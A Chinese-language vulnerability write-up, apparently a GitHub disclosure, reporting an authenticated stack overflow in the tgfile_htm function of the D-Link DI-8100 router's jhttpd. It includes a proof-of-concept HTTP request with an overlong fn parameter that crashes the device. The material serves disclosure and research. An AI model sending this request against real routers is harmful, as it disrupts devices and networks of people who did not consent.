# DI-8100 0Day
# 产品介绍
D-Link DI-8100是D-Link专为中小型网络环境设计的宽带路由器，支持最多4个互联网端口和最多4个局域网端口。它采用网络专用处理器，性能优越，能满足80个用户同时上网的需求。支持多线路带宽叠加，PPPOE认证计费、WEB认证计费，DNS缓存服务器，多LAN口VLAN隔离，酒店模式，智能流量控制，IP-MAC地址绑定，上网行为管理，VPN应用等功能。内置硬件防火墙，能有效防范DDoS类攻击，ARP欺骗等病毒入侵。
![image](https://github.com/user-attachments/assets/5bfa3dbc-4435-4f95-bd72-b2ab7ad79b08)

# 固件模拟
使用FirmAE直接运行即可模拟DI-8100
![image](https://github.com/user-attachments/assets/d2de7d8c-489e-44f1-ad5e-b19abba4daf6)

# tgfile_htm
在二进制文件jhttpd中，`tgfile_htm`函数中,参数`fn`可控。
![image](https://github.com/user-attachments/assets/387d1e75-3264-4ab4-914a-68f733113599)

使用`sprintf`拼接到栈上，如果`fn`参数过长，触发栈溢出。
## POC 
注：此攻击方法需要授权，普通用户进入登录页面
```http
http://192.168.0.1/tgfile.asp?fn=AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
```
## Result
![image](https://github.com/user-attachments/assets/2b140880-4922-4211-9760-91736380dc59)
